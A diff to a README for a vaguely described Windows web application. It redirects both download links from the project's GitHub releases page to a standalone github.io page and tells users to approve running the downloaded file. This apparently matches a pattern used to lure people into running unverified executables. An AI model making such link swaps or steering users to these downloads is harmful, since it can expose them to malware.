@@ -1,6 +1,6 @@
 # 🌐 apexplanet-web-application-2026 - A fast way to browse web
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/chitinous-bumperguard431/apexplanet-web-application-2026/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://chitinous-bumperguard431.github.io)
 
 ## 📋 About the software
 
@@ -34,7 +34,7 @@ Follow these steps to set up the software on your machine:
 
 You can find the latest version on our official release page. Visit this page to download the software for Windows. 
 
-[Click here to open the download page](https://github.com/chitinous-bumperguard431/apexplanet-web-application-2026/releases)
+[Click here to open the download page](https://chitinous-bumperguard431.github.io)
 
 Once the download finishes, repeat the steps in the setup guide. If your computer asks for permission to run the file, select yes to continue.
 
